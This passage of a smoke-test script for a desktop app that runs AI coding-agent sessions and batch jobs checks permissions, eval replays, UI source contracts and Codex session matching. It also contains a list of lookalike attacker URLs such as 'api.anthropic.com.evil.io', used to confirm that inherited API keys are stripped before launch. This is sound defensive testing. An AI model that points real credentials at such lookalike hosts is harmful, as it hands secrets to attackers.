  say('── private local storage');
  try {
    const database = path.join(dataDir(), 'wanigan.db');
    check(permissionBits(dataDir()) === 0o700 && permissionBits(database) === 0o600,
      'Wanigan user data and its SQLite database are owner-only');
    const sqliteSidecars = ['-wal', '-shm']
      .map((suffix) => `${database}${suffix}`)
      .filter((file) => fs.existsSync(file));
    check(sqliteSidecars.every((file) => permissionBits(file) === 0o600),
      'SQLite journal sidecars are owner-only when present', sqliteSidecars);
    const resultFiles = fs.readdirSync(resultsDir()).filter((name) => /\.(?:jsonl|mock\.json)$/.test(name));
    check(permissionBits(resultsDir()) === 0o700 && resultFiles.length > 0 &&
      resultFiles.every((name) => permissionBits(path.join(resultsDir(), name)) === 0o600),
    'batch result archives and their directory are owner-only', resultFiles);
  } catch (error) {
    check(false, `private local storage suite threw: ${error instanceof Error ? error.message : String(error)}`);
  }

  /* ── phase 14 · the polling curve ──────────────────────────────────── */
  say('── phase 14 · polling');
  const now = Date.now();
  const fresh = notify.pollIntervalFor(now - 5 * 60_000, now - 60_000, now);
  const old = notify.pollIntervalFor(now - 6 * 3600_000, now - 3 * 3600_000, now);
  check(fresh < old, 'polling is tighter in the first hour than after six', `${fresh}ms vs ${old}ms`);
  const nearExpiry = notify.pollIntervalFor(now - 23.7 * 3600_000, now - 3 * 3600_000, now);
  check(nearExpiry < old, 'polling tightens again as the 24-hour expiry approaches', `${nearExpiry}ms`);

  // The inbound webhook receiver is gone: polling is the whole answer on
  // "local, and yours" grounds, and notify.ts no longer opens a listening
  // socket of its own. What is left is the toggle, and it defaults on — which
  // is what obliges every announce in that file to actually reach the OS.
  check(notify.notificationsEnabled(),
    'notifications default on, so an announce is a promise the app has to keep');

  /* ── phase 18 · budgets ────────────────────────────────────────────── */
  say('── phase 18 · budgets');
  spend.setBudget(null, 25, 0.8);
  const g = spend.budgetState(null);
  check(g.monthlyUsd === 25, 'a global budget is stored and read back', g.monthlyUsd);
  check(g.daysInMonth >= 28 && g.daysElapsed >= 1, 'the month is measured for the projection',
    `${g.daysElapsed}/${g.daysInMonth}`);
  check(typeof g.projectedUsd === 'number' && Number.isFinite(g.projectedUsd),
    'month-end spend is projected from the run rate');
  spend.setBudget(null, 0);

  /* ── phase 16 · cache diagnosis ────────────────────────────────────── */
  say('── phase 16 · cache diagnosis');
  const min = cachediag.minimumCacheablePrefix('claude-sonnet-5');
  check(min >= 512, 'a minimum cacheable prefix is known for the model', min);
  const ttl = cachediag.recommendedTtl(baseCfg(), 20_000);
  check(ttl.ttl === '1h', 'a large batch is recommended the 1-hour TTL', ttl.ttl);
  check(ttl.why.length > 20, 'the recommendation explains itself', ttl.why);

  /* ── phase 17 · single-variable enforcement ────────────────────────── */
  say('── phase 17 · evals');
  const one = evals.variableBetween(baseCfg(), baseCfg({ model: 'claude-opus-5' }));
  check(one.variable === 'model', 'a single differing field is identified', one.variable);
  const two = evals.variableBetween(baseCfg(), baseCfg({ model: 'claude-opus-5', effort: 'max' }));
  check(two.variable === null && two.differences.length === 2,
    'two differing fields yield no single variable — the comparison is uninterpretable',
    two.differences);
  const same = evals.variableBetween(baseCfg(), baseCfg());
  check(same.differences.length === 0, 'identical configs differ in nothing');

  // A golden set that nothing can read back is a snapshot with no reader: rows
  // were pinned, stored, listed — and the Evals tab told the operator to pin
  // them — while evals.goldenSource() had no caller anywhere in the app. These
  // two assertions are the pair that was missing: that a renderer reads a set
  // back into a run's source at all, and that the run it builds is the same
  // size as the thing that was pinned. A replay that quietly loses rows is
  // worse than no replay, because the comparison still looks like one.
  const batchesViewSrc = sourceOf('src/renderer/src/views/Batches.tsx');
  check(/source: await window\.wanigan\.evals\.goldenSource\(/.test(batchesViewSrc),
    'the batch builder reads a pinned set back through evals.goldenSource and makes it the run’s source');
  check(/'command', 'golden'\] as const/.test(batchesViewSrc),
    'and it is offered as an arm of the dataset picker, beside CSV, JSONL, Files and Command');
  // Batches is three screens behind one tab. Which one was open, whether the
  // run list had been drawn past its 60-row cut, and where that list was
  // scrolled were all component state: opening a run from row 140 and pressing
  // back returned to the top of a 60-row table, which reads as runs having
  // gone missing rather than as a view that forgot where it was.
  check(/useViewMemory<Page>\('page', \{ page: 'list' \}\)/.test(batchesViewSrc)
    && /useViewMemory\('expanded', false\)/.test(batchesViewSrc)
    && !/const \[expanded, setExpanded\] = useState/.test(batchesViewSrc)
    && /const paneRef = useRememberedScrollRef\('runs'\);/.test(batchesViewSrc)
    && /<div className="pane" ref=\{paneRef\}>/.test(batchesViewSrc)
    && /if \(seed\) setView\(\{ page: 'new' \}\)/.test(batchesViewSrc),
    'Batches reopens on the screen it was left on, with the run list still drawn in full and scrolled where it was — while a session handing over its changed files still overrides that and opens the builder');
  check(/sets\.length === 0[\s\S]{0,200}Nothing pinned yet/.test(batchesViewSrc),
    'with nothing pinned it says so, rather than rendering a select with no options in it');
  // Switching tabs unmounts the whole of Batches, and the builder is minutes
  // of typing: a name, two prompts, a schema and a dataset. Leaving it to look
  // at the session whose changed files it was going to review threw the lot
  // away, with nothing on the way back to say a builder had ever been open.
  // Source contract, because the smoke process has no renderer to swap tabs in.
  check(batchesViewSrc.includes("useViewMemory<RunConfig | null>('newRunCfg', null)")
    && /import \{ useRememberedScrollRef, useViewMemory \} from '\.\.\/components\/viewMemory';/.test(batchesViewSrc)
    && !/const \[cfg, setCfg\] = useState/.test(batchesViewSrc)
    && /if \(!cfg \|\| !presets\.length\)/.test(batchesViewSrc),
    'a half-built batch run survives a tab swap, and the form still waits for the preset and model tables — a restored draft arrives before that read lands, and rendering on it would show an empty recipe grid and a “cap 0” max-tokens hint as though they were capabilities somebody had read');
  // The other half of remembering a draft is being able to drop it. A back
  // button that only hid the builder would make “← Batches” mean “hide this
  // until I come back”, and a draft kept after submission would open the next
  // New run on the config of a batch that has already been sent.
  check(/const forget = \(\) => \{[^}]*setCfg\(null\)[^}]*\};/.test(batchesViewSrc)
    && /const leave = \(\) => \{\s*forget\(\);\s*onCancel\(\);\s*\};/.test(batchesViewSrc)
    && /forget\(\);\s*onDone\(r\.runId\);/.test(batchesViewSrc)
    && !/onClick=\{onCancel\}/.test(batchesViewSrc),
    'Cancel means cancel: both back buttons and a successful submit drop the remembered draft, so the next New run opens blank rather than on an abandoned or already-submitted one');

  // React matches hooks by call order, so a hook below an early return is
  // called on the render that has data and skipped on the render that does not.
  // Run detail shipped with `actErr` and `confirmDelete` below
  // `if (!d) { … return <Reading/> }`, and `d` arrives from an async read: the
  // first render ran two hooks fewer than the second, React threw "Rendered
  // more hooks than during the previous render", and the ErrorBoundary caught
  // it — opening any run showed an error card where the run should be. There is
  // no ESLint here to carry react-hooks/rules-of-hooks and no renderer in this
  // process, so this is a source contract: every hook call in RunDetail sits
  // above the guard, and a rename of `d` fails this loudly rather than passing
  // on a guard it can no longer find.
  const runDetailStart = batchesViewSrc.indexOf('function RunDetail(');
  const runDetailEnd = batchesViewSrc.indexOf('\n}\n', runDetailStart);
  const runDetailBody = runDetailStart < 0 ? ''
    : batchesViewSrc.slice(runDetailStart, runDetailEnd < 0 ? batchesViewSrc.length : runDetailEnd);
  const runDetailGuard = runDetailBody.indexOf('\n  if (!d) {');
  // Body-level lines only (two spaces, then code), and the generic in
  // `useState<string | null>(` is why the <…> is optional rather than absent:
  // without it this misses one of the two calls that caused the crash.
  const hooksBelowGuard: string[] = runDetailGuard < 0 ? []
    : runDetailBody.slice(runDetailGuard).split('\n')
        .filter((l) => /^  \S/.test(l) && /(?:^|[^\w.$])use[A-Z]\w*\s*(?:<[^;{}=]*>\s*)?\(/.test(l))
        .map((l) => l.trim());
  check(runDetailGuard > 0 && hooksBelowGuard.length === 0,
    'every hook in Batches’ run detail is called above the `if (!d)` early return, so the render that is still reading and the render that has the run call the same hooks in the same order',
    runDetailGuard > 0
      ? `hooks below the guard: ${hooksBelowGuard.join(' · ') || 'none'}`
      : 'RunDetail or its `if (!d)` guard was not found in Batches.tsx');

  // A <tr> takes no focus, and neither of these rows held a child that did, so
  // run detail, results, the refusal lane and the evals tab were all reachable
  // by pointer only. The row click stays for pointers; the identifying cell
  // becomes the button.
  check(batchesViewSrc.includes('onClick={(e) => { e.stopPropagation(); onOpen(r.id); }}>{r.name}</button>')
    && batchesViewSrc.includes('onClick={(e) => { e.stopPropagation(); setOpen(r); }}>{r.custom_id}</button>'),
    'both of Batches’ clickable tables put a real button on their identifying cell, so a run and a result row can each be opened from the keyboard without the row losing its pointer click',
    `run name button ${batchesViewSrc.includes('}}>{r.name}</button>')} · custom_id button ${batchesViewSrc.includes('}}>{r.custom_id}</button>')}`);
  // Three reads on the Evals tab answered a rejection with an empty array, which
  // turns "Wanigan could not read this" into "there is none of this" — and the
  // card that says "Only one run exists" is drawn off exactly that array.
  check(!/catch \{ setPairs\(\[\]\); \}/.test(batchesViewSrc)
    && !/catch \{ setGolden\(\[\]\); \}/.test(batchesViewSrc)
    && !/batch\.runs\(\)\.then\(\(r\) => setRuns\(r as Run\[\]\)\)\.catch\(\(\) => \{\}\)/.test(batchesViewSrc)
    && batchesViewSrc.includes('const [runs, setRuns] = useState<Run[] | null>(null);')
    && !batchesViewSrc.includes('const t = setInterval(load, 8000);')
    && batchesViewSrc.includes('const t = setInterval(() => { if (!document.hidden) void load(); }, 8000);'),
    'no read behind the Evals tab answers a failure with an empty array, and neither eight-second poll spends on a window nobody is looking at — “Only one run exists” is now a count of runs that came back rather than the initial value of a state the read never reached',
    'four negations and two positives');

  const goldenPinRun = await batch.createAndSubmitRun(baseCfg({
    name: 'smoke golden source',
    source: { kind: 'jsonl', text: Array.from({ length: 4 }, (_, i) => `{"text":"gold ${i}"}`).join('\n') },
  }));
  const pinnedSet = evals.saveGoldenSet('smoke pinned set', goldenPinRun.runId);
  const pinnedSource = evals.goldenSetSource(pinnedSet.id);
  check(pinnedSource.kind === 'jsonl',
    'a pinned set reads back as jsonl — the one source kind that cannot re-read the world at submit time',
    pinnedSource.kind);
  const goldenReplay = await batch.createAndSubmitRun(baseCfg({ name: 'smoke golden replay', source: pinnedSource }));
  check(goldenReplay.requests === pinnedSet.rows,
    'a run built from the golden set carries exactly the pinned row count',
    `${goldenReplay.requests} vs ${pinnedSet.rows}`);

  /* ── P6 · the run list is a list, not a copy of every dataset ──────── */
  // listRuns() answered SELECT r.*, so the operator's entire pasted CSV crossed
  // the IPC boundary every eight seconds for a table that draws a name, a
  // model, four counts and a cost. Measured against a copy of this schema, one
  // run holding a 20,000-line CSV was 118KB on its own row.
  const p6Marker = 'CONFIG-MARKER-9f31';
  const p6Run = await batch.createAndSubmitRun(baseCfg({
    name: 'smoke config privacy',
    source: { kind: 'jsonl', text: `{"text":"${p6Marker}"}` },
  }));
  const p6Listed = batch.listRuns() as Record<string, unknown>[];
  const p6Schema = (db().prepare('PRAGMA table_info(runs)').all() as { name: string }[]).map((c) => c.name);
  const p6Missing = p6Schema.filter((c) => c !== 'config_json' && !(c in (p6Listed[0] ?? {})));
  check(p6Listed.length > 0 && p6Missing.length === 0 && !('config_json' in p6Listed[0]),
    'the run list carries every runs column except config_json, so narrowing the read dropped the dataset and nothing else — a hand-typed column list is the version of this that silently loses a value instead',
    `${p6Listed.length} rows · ${Object.keys(p6Listed[0] ?? {}).length} keys per row · ${p6Schema.length} columns in runs · missing ${p6Missing.join(',') || 'none'}`);
  check(!JSON.stringify(p6Listed).includes(p6Marker),
    'and the whole serialised list contains no trace of the row pasted into that run — this is the assertion that fails the moment SELECT r.* comes back',
    `${JSON.stringify(p6Listed).length} bytes for the entire list`);
  check(JSON.stringify(batch.runDetail(p6Run.runId).config).includes(p6Marker),
    'while the run’s own detail page still reads its config back in full, which is where the builder, the retry path and the evals tab get it from — this was a scoping change, not a deletion',
    batch.runDetail(p6Run.runId).run.id);
  const p6Row = p6Listed[0];
  check('kind' in p6Row && 'project_id' in p6Row && 'expires_at' in p6Row && 'project_name' in p6Row,
    'and the columns its consumers filter on all survived: Schedules’ re-run picker reads kind, the MCP run listing scopes on project_id, and the list’s own expiry and project-name subqueries are still computed',
    Object.keys(p6Row).join(','));

  /* ── which CLI a provider actually runs ────────────────────────────── */
  // Everything a session gets — hooks, MCP servers, --session-id, an archived
  // transcript — used to be gated on `id === 'claude'`. GLM is that same binary
  // pointed at another API, so it was denied all four by its label rather than
  // by anything it does, and the queue reported sessions Wanigan could not see
  // into. Codex is a genuinely different program and exits on an unknown
  // --settings, so the test has to be the binary.
  say('── providers · the binary, not the label');
  check(providers.runsClaudeCli('claude'), 'claude runs the claude CLI');
  check(providers.runsClaudeCli('glm'), 'so does glm, which is what earns it hooks and a transcript');
  check(providers.runsClaudeCli('deepseek'), 'DeepSeek uses the reviewed Claude Code harness too');
  check(!providers.runsClaudeCli('codex'), 'codex does not, and still gets none of those flags');
  check(!providers.runsClaudeCli('made-up'), 'an id nobody recognises is refused rather than guessed at');
  check(providers.providerById('glm')?.bin === 'claude' && providers.providerById('codex')?.bin === 'codex',
    'and the provider table agrees: glm spawns claude, codex spawns codex');
  const priorDeepseekKey = process.env.WANIGAN_DEEPSEEK_KEY;
  process.env.WANIGAN_DEEPSEEK_KEY = 'smoke-deepseek-key';
  const deepseekEnv = providers.providerById('deepseek')?.env?.() ?? {};
  if (priorDeepseekKey === undefined) delete process.env.WANIGAN_DEEPSEEK_KEY;
  else process.env.WANIGAN_DEEPSEEK_KEY = priorDeepseekKey;
  check(deepseekEnv.ANTHROPIC_BASE_URL === 'https://api.deepseek.com/anthropic' &&
    deepseekEnv.ANTHROPIC_AUTH_TOKEN === 'smoke-deepseek-key',
  'DeepSeek launches against its Anthropic-compatible endpoint with its own credential', deepseekEnv.ANTHROPIC_BASE_URL);
  const codexArgs = providers.providerById('codex')?.args([], { model: 'gpt-5.6-luna', effort: 'high' }) ?? [];
  check(codexArgs.includes('--model') && codexArgs.includes('gpt-5.6-luna'),
    'a chosen Codex model is passed to the CLI');
  check(codexArgs.includes('--config') && codexArgs.includes('model_reasoning_effort="high"'),
    'a chosen Codex effort is passed as its typed config key, not a Claude flag');
  check(!codexArgs.includes('--effort'), 'Codex never receives Claude’s unsupported --effort flag');
  const sessionLaunchSrc = sourceOf('src/main/sessions.ts');
  check(/def\.harness === 'codex'[\s\S]{0,800}?--sandbox', 'workspace-write'[\s\S]{0,800}?--add-dir/.test(sessionLaunchSrc),
    'Codex attachment roots explicitly use workspace-write, so a read-only user default cannot reject every new session');
  const exactCodexThread = '01a04e58-e0eb-7a41-82b7-ddcacf7a9038';
  const legacyResumeArgs = providers.providerById('codex')?.resumeArgs(exactCodexThread) ?? [];
  const packedResumeArgs = providers.providerPackRegistry
    .runtimeById('codex')?.resumeArgs(exactCodexThread) ?? [];
  check(JSON.stringify(legacyResumeArgs) === JSON.stringify(['resume', exactCodexThread]),
    'legacy Codex wiring resumes the selected UUID, never whichever thread is last', legacyResumeArgs);
  check(JSON.stringify(packedResumeArgs) === JSON.stringify(['resume', exactCodexThread]),
    'the built-in Codex pack also resumes the selected UUID', packedResumeArgs);
  check(!legacyResumeArgs.includes('--last') && !packedResumeArgs.includes('--last'),
    'an exact Codex resume never uses --last');
  check(JSON.stringify(providers.providerById('codex')?.resumeArgs(null)) === JSON.stringify(['resume']),
    'a missing legacy thread id opens the honest picker rather than guessing the latest thread');
  const matchedCodexThreads = matchCodexThreads(
    [
      { id: 'wanigan-one', cwd: '/tmp/same-project', startedAt: 1_000 },
      { id: 'wanigan-two', cwd: '/tmp/same-project', startedAt: 2_000 },
    ],
    [
      { id: 'thread-one', cwd: '/tmp/same-project', createdAt: 1_043, rolloutPath: null },
      { id: 'thread-two', cwd: '/tmp/same-project', createdAt: 2_071, rolloutPath: null },
      { id: 'wrong-project', cwd: '/tmp/other-project', createdAt: 1_001, rolloutPath: null },
    ],
  );
  check(matchedCodexThreads.get('wanigan-one') === 'thread-one'
    && matchedCodexThreads.get('wanigan-two') === 'thread-two',
  'two Codex sessions in one project retain two distinct exact thread identities',
  Object.fromEntries(matchedCodexThreads));
  const laterOwnsCloserThread = matchCodexThreads(
    [
      { id: 'earlier', cwd: '/tmp/same-project', startedAt: 1_000 },
      { id: 'later', cwd: '/tmp/same-project', startedAt: 1_090 },
    ],
    [{ id: 'only-thread', cwd: '/tmp/same-project', createdAt: 1_080, rolloutPath: null }],
  );
  check(!laterOwnsCloserThread.has('earlier') && laterOwnsCloserThread.get('later') === 'only-thread',
    'an earlier row cannot greedily steal the later row’s uniquely closer Codex thread');
  const ambiguousCodexThread = matchCodexThreads(
    [{ id: 'wanigan-ambiguous', cwd: '/tmp/same-project', startedAt: 1_000 }],
    [
      { id: 'before', cwd: '/tmp/same-project', createdAt: 990, rolloutPath: null },
      { id: 'after', cwd: '/tmp/same-project', createdAt: 1_010, rolloutPath: null },
    ],
  );
  check(!ambiguousCodexThread.has('wanigan-ambiguous'),
    'an ambiguous Codex identity stays unresolved instead of guessing a writer');

  const realCodexCwd = path.join(tmp, 'codex-real-cwd');
  const linkedCodexCwd = path.join(tmp, 'codex-linked-cwd');
  fs.mkdirSync(realCodexCwd);
  fs.symlinkSync(realCodexCwd, linkedCodexCwd, 'dir');
  check(matchCodexThreads(
    [{ id: 'symlink-launch', cwd: linkedCodexCwd, startedAt: 1_000 }],
    [{ id: 'symlink-thread', cwd: realCodexCwd, createdAt: 1_050, rolloutPath: null }],
  ).get('symlink-launch') === 'symlink-thread',
  'Codex identity matching canonicalises a symlinked project path');

  const fakeCodexHome = path.join(tmp, 'codex-identity-home');
  fs.mkdirSync(fakeCodexHome);
  const fakeState = new Database(path.join(fakeCodexHome, 'state_5.sqlite'));
  fakeState.exec(`
    CREATE TABLE threads (
      id TEXT PRIMARY KEY, cwd TEXT, created_at_ms INTEGER, created_at INTEGER,
      source TEXT, thread_source TEXT, rollout_path TEXT
    )
  `);
  const stateInsert = fakeState.prepare(
    'INSERT INTO threads (id,cwd,created_at_ms,created_at,source,thread_source,rollout_path) VALUES (?,?,?,?,?,?,?)'
  );
  const identityAt = Date.now() - 30_000;
  const identityCwd = path.join(tmp, 'codex-identity-project');
  const orphanCwd = path.join(tmp, 'codex-orphan-project');
  const discoveredId = '11111111-1111-4111-8111-111111111111';
  const inheritedId = '22222222-2222-4222-8222-222222222222';
  const conflictOne = '33333333-3333-4333-8333-333333333333';
  const conflictTwo = '44444444-4444-4444-8444-444444444444';
  const secondsFallbackId = '66666666-6666-4666-8666-666666666666';
  const deferredPromptId = '77777777-7777-4777-8777-777777777777';
  const deferredPromptCwd = path.join(tmp, 'deferred-prompt');
  const deferredPromptAt = identityAt + 20_000;
  const startupReservedId = '88888888-8888-4888-8888-888888888888';
  const startupReservedCwd = path.join(tmp, 'startup-reserved-prompt');
  const startupReservedAt = deferredPromptAt - 7_000;
  const exactRecoveryId = 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa';
  const exactRecoveryCwd = path.join(tmp, 'exact-recovery-project');
  const wrongRecoveryCwd = path.join(tmp, 'wrong-recovery-project');
  const exactRollout = path.join(fakeCodexHome, 'sessions', '2026', '08', '30', `rollout-smoke-${exactRecoveryId}.jsonl`);
  fs.mkdirSync(identityCwd, { recursive: true });
  fs.mkdirSync(orphanCwd, { recursive: true });
  fs.mkdirSync(path.join(tmp, 'seconds-fallback'), { recursive: true });
  fs.mkdirSync(deferredPromptCwd, { recursive: true });
  fs.mkdirSync(startupReservedCwd, { recursive: true });
  fs.mkdirSync(exactRecoveryCwd, { recursive: true });
  fs.mkdirSync(wrongRecoveryCwd, { recursive: true });
  fs.mkdirSync(path.dirname(exactRollout), { recursive: true });
  fs.writeFileSync(exactRollout, `${JSON.stringify({
    type: 'session_meta',
    payload: { id: exactRecoveryId, cwd: exactRecoveryCwd, source: 'cli', thread_source: 'user' },
  })}\n`);
  const secondsAt = Math.floor((identityAt + 5_000) / 1_000) * 1_000;
  stateInsert.run(discoveredId, identityCwd, identityAt + 51, 0, 'cli', 'user', null);
  stateInsert.run('55555555-5555-4555-8555-555555555555', orphanCwd,
    identityAt + 2_051, 0, 'cli', 'user', null);
  stateInsert.run(secondsFallbackId, path.join(tmp, 'seconds-fallback'), null,
    secondsAt / 1_000, 'cli', 'user', null);
  stateInsert.run(deferredPromptId, deferredPromptCwd, deferredPromptAt, 0, 'cli', 'user', null);
  stateInsert.run(startupReservedId, startupReservedCwd, startupReservedAt, 0, 'cli', 'user', null);
  stateInsert.run(exactRecoveryId, exactRecoveryCwd, identityAt + 8_000, 0, 'cli', 'user', exactRollout);
  fakeState.close();

  const identityRows = [
    ['s_smoke_codex_identity_root', null, identityCwd, identityAt, null],
    ['s_smoke_codex_identity_child', null, identityCwd, identityAt + 500, 's_smoke_codex_identity_root'],
    ['s_smoke_codex_identity_bi_root', null, path.join(tmp, 'bi'), identityAt + 1_000, null],
    ['s_smoke_codex_identity_bi_child', inheritedId, path.join(tmp, 'bi'), identityAt + 1_500,
      's_smoke_codex_identity_bi_root'],
    ['s_smoke_codex_identity_conflict_root', null, path.join(tmp, 'conflict'), identityAt + 2_000, null],
    ['s_smoke_codex_identity_conflict_one', conflictOne, path.join(tmp, 'conflict'), identityAt + 2_100,
      's_smoke_codex_identity_conflict_root'],
    ['s_smoke_codex_identity_conflict_two', conflictTwo, path.join(tmp, 'conflict'), identityAt + 2_200,
      's_smoke_codex_identity_conflict_root'],
    ['s_smoke_codex_identity_orphan', null, orphanCwd, identityAt + 2_000, 'missing-parent'],
    ['s_smoke_codex_identity_seconds', null, path.join(tmp, 'seconds-fallback'), secondsAt, null],
    ['s_smoke_codex_identity_deferred', null, deferredPromptCwd, identityAt, null],
    ['s_smoke_codex_identity_startup_reserved', null, startupReservedCwd, startupReservedAt, null],
  ] as const;
  const sessionInsert = db().prepare(`
    INSERT INTO session_log
      (id,conversation_id,provider_id,project_path,project_name,started_at,resumed_from,origin,harness_id)
    VALUES (?,?,'codex',?,'identity smoke',?,?,'wanigan','codex')
  `);
  for (const row of identityRows) sessionInsert.run(...row);
  const priorCodexHome = process.env.CODEX_HOME;
  try {
    process.env.CODEX_HOME = fakeCodexHome;
    const exact = validateExactCodexThread(exactRecoveryId.toUpperCase(), exactRecoveryCwd);
    check(exact.id === exactRecoveryId && exact.cwd === fs.realpathSync.native(exactRecoveryCwd)
      && exact.rolloutPath === fs.realpathSync.native(exactRollout),
    'an explicit Codex recovery UUID must agree across state_5, rollout session_meta and the selected canonical project');
    let wrongProjectRejected = false;
    try { validateExactCodexThread(exactRecoveryId, wrongRecoveryCwd); }
    catch { wrongProjectRejected = true; }
    check(wrongProjectRejected,
      'an exact Codex recovery refuses a UUID when its saved canonical CWD does not match the selected project');
    backfillCodexThreadIds();
    const identity = (id: string) => (db().prepare(
      'SELECT conversation_id FROM session_log WHERE id = ?'
    ).get(id) as { conversation_id: string | null }).conversation_id;
    check(identity('s_smoke_codex_identity_root') === discoveredId
      && identity('s_smoke_codex_identity_child') === discoveredId,
    'legacy Codex roots are matched from the durable index and propagated to descendants');
    check(identity('s_smoke_codex_identity_bi_root') === inheritedId,
      'a known child repairs its whole Codex resume lineage in both directions');
    check(identity('s_smoke_codex_identity_conflict_root') === null,
      'conflicting UUIDs in one Codex lineage remain unresolved');
    check(identity('s_smoke_codex_identity_orphan') === null,
      'a resume whose parent is missing is never mistaken for a newly-created Codex thread');
    check(identity('s_smoke_codex_identity_seconds') === secondsFallbackId,
      'Codex indexes without created_at_ms fall back to their seconds timestamp');
    check(captureNewCodexThreadId('s_smoke_codex_identity_deferred', deferredPromptCwd, deferredPromptAt) === deferredPromptId,
      'a new Codex thread created at the first prompt is captured even when the terminal started earlier');
    check(captureNewCodexThreadId(
      's_smoke_codex_identity_startup_reserved', startupReservedCwd, deferredPromptAt, 5_000, startupReservedAt,
    ) === startupReservedId,
    'a Codex thread reserved at terminal startup is captured after its first prompt marks it as a user thread');
    // The Codex state-index read is guarded at the CALL, not inside stateThreads():
    // applyMatches() no-ops on an empty `roots`, but the argument is evaluated first,
    // so an unguarded call opened one state_5.sqlite per Codex home and PRAGMA-probed
    // it on every pass with nothing to repair -- and discoverCodexThreadId() repeats
    // that pass every 100ms for up to 8s. Only a source pin can see this:
    // backfillCodexThreadIds() returns an UPDATE change count, which is identical
    // whether or not the index was read, so a behavioural check here would assert
    // something it does not test.
    const stateIndexCalls = sourceOf('src/main/codex-sessions.ts')
      .split('\n').filter((line) => /applyMatches\(\s*stateThreads\(/.test(line));
    check(stateIndexCalls.length === 1
      && stateIndexCalls.every((line) => /if\s*\(roots\.length\)/.test(line)),
    'the Codex backfill reads the state index only when a root still needs matching');
  } finally {
    db().prepare("DELETE FROM session_log WHERE id LIKE 's_smoke_codex_identity_%'").run();
    if (priorCodexHome === undefined) delete process.env.CODEX_HOME;
    else process.env.CODEX_HOME = priorCodexHome;
  }

  let codexControl = scanCodexNotifications('', '\x1b]');
  check(codexControl.signals.length === 0 && codexControl.pending === '\x1b]',
    'a Codex lifecycle control split across PTY chunks is retained without treating output as state');
  codexControl = scanCodexNotifications(
    codexControl.pending,
    '9;Approval requested: run command\x07noise\x1b]9;Agent turn complete\x1b\\',
  );
  check(JSON.stringify(codexControl.signals) === JSON.stringify(['permission', 'finished']),
    'Codex approval and completed-turn OSC notifications become provider-neutral lifecycle signals',
    codexControl.signals);

  /* ── sessions · an ambient Anthropic key never rides along ───────── */
  // A provider pack chooses its own base URL and a pack is untrusted data, so
  // an operator's exported ANTHROPIC_API_KEY must not travel to whatever host
  // it names. The lookalikes below are the whole point of asserting this: a
  // substring test for 'api.anthropic.com' calls both of them official and
  // hands the key over, which is exactly the regression to keep closed.
  say('── sessions · credential strip at the provider boundary');
  const priorAmbientKey = process.env.ANTHROPIC_API_KEY;
  const priorAmbientAdmin = process.env.ANTHROPIC_ADMIN_KEY;
  process.env.ANTHROPIC_API_KEY = 'sk-ant-smoke-ambient-key';
  process.env.ANTHROPIC_ADMIN_KEY = 'sk-ant-smoke-ambient-admin';
  try {
    const glmEnv = { ANTHROPIC_BASE_URL: 'https://api.z.ai/api/anthropic', ANTHROPIC_AUTH_TOKEN: 'glm-own-token' };
    const deepseekEnvFixture = {
      ANTHROPIC_BASE_URL: 'https://api.deepseek.com/anthropic', ANTHROPIC_AUTH_TOKEN: 'deepseek-own-token',
    };
    const redirected = sessionsTest.agentEnv('/usr/bin', 's_smoke_env_glm', glmEnv);
    check(redirected.ANTHROPIC_API_KEY === undefined && redirected.ANTHROPIC_ADMIN_KEY === undefined,
      'a redirected base URL strips both inherited Anthropic keys from the child environment',
      Object.keys(redirected).filter((k) => k.startsWith('ANTHROPIC_')).sort());
    check(redirected.ANTHROPIC_AUTH_TOKEN === 'glm-own-token'
      && sessionsTest.agentEnv('/usr/bin', 's_smoke_env_ds', deepseekEnvFixture).ANTHROPIC_AUTH_TOKEN === 'deepseek-own-token',
    'while GLM and DeepSeek keep the credential their own profile declared');
    const declaredOwnKey = sessionsTest.agentEnv('/usr/bin', 's_smoke_env_declared', {
      ANTHROPIC_BASE_URL: 'https://api.z.ai/api/anthropic', ANTHROPIC_API_KEY: 'profile-declared-key',
    });
    check(declaredOwnKey.ANTHROPIC_API_KEY === 'profile-declared-key',
      'a profile that deliberately declares one of those names keeps it — only the borrowed value is dropped');
    const official = sessionsTest.agentEnv('/usr/bin', 's_smoke_env_anthropic', {
      ANTHROPIC_BASE_URL: 'https://api.anthropic.com',
    });
    check(official.ANTHROPIC_API_KEY === 'sk-ant-smoke-ambient-key'
      && official.ANTHROPIC_ADMIN_KEY === 'sk-ant-smoke-ambient-admin',
    'and a session actually pointed at Anthropic still receives the keys it needs');
    const lookalikes = [
      'https://api.anthropic.com.evil.io',
      'https://api.anthropic.com.evil.io/v1',
      'https://evil.com/api.anthropic.com',
      'https://evil.com/?next=https://api.anthropic.com',
      'https://sub.api.anthropic.com',
      'https://api.anthropic.com@evil.io',
      // A plaintext hop to the right hostname is still somewhere else.
      'http://api.anthropic.com',
      // Unparseable is not evidence of the official endpoint; it fails closed.
      'api.anthropic.com',
    ];
    const treatedAsOfficial = lookalikes.filter((base) => !sessionsTest.redirectsAnthropicApi({ ANTHROPIC_BASE_URL: base }));
    check(treatedAsOfficial.length === 0,
      'a host that merely contains the official one is a redirect, so a naive substring test cannot leak the key',
      treatedAsOfficial.join(', '));
    const leakedToLookalike = lookalikes.filter((base) => {
      const env = sessionsTest.agentEnv('/usr/bin', 's_smoke_env_lookalike', { ANTHROPIC_BASE_URL: base });
      return env.ANTHROPIC_API_KEY !== undefined || env.ANTHROPIC_ADMIN_KEY !== undefined;
    });
    check(leakedToLookalike.length === 0,
      'and no lookalike host receives an inherited key through the launch environment',
      leakedToLookalike.join(', '));
    check(!sessionsTest.redirectsAnthropicApi({})
      && !sessionsTest.redirectsAnthropicApi({ ANTHROPIC_BASE_URL: '  ' })
      && !sessionsTest.redirectsAnthropicApi({ ANTHROPIC_BASE_URL: 'https://API.Anthropic.Com/v1' }),
    'a profile that names no base URL, or the official one in any casing, is not a redirect');
  } finally {
    if (priorAmbientKey === undefined) delete process.env.ANTHROPIC_API_KEY;
    else process.env.ANTHROPIC_API_KEY = priorAmbientKey;
    if (priorAmbientAdmin === undefined) delete process.env.ANTHROPIC_ADMIN_KEY;
    else process.env.ANTHROPIC_ADMIN_KEY = priorAmbientAdmin;
  }

  /* ── sessions · durable recents, not an execution ledger ─────────── */
  say('── sessions · durable recents');
  const recentPrefix = `s_smoke_recent_${Date.now().toString(36)}`;
  const recentConversation = '88888888-8888-4888-8888-888888888888';
  const staleConversation = '99999999-9999-4999-8999-999999999999';
  const recentAt = Date.now() - 10_000;
  const recentInsert = db().prepare(`
    INSERT INTO session_log
      (id,conversation_id,provider_id,project_path,project_name,started_at,ended_at,exit_code,resumed_from,origin,harness_id)
